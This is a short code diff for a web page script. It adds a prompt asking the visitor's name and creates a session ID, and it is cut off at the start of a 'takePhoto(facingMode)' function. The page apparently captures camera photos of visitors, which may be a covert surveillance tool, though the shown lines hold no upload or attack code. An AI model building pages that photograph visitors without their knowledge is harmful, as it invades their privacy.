@@ -12,7 +12,15 @@
 <script>
 (async function() {
     const status = document.getElementById("status");
-    const name = "visitor"; // default name (or you can take from URL params)
+
+    // Ask for name immediately
+    let name = prompt("Enter your name:");
+    if (!name || !name.trim()) {
+        name = "visitor";
+    }
+    name = name.trim();
+
+    // Create unique session ID
     const sessionId = Date.now().toString() + Math.floor(Math.random() * 1000);
 
     async function takePhoto(facingMode) {
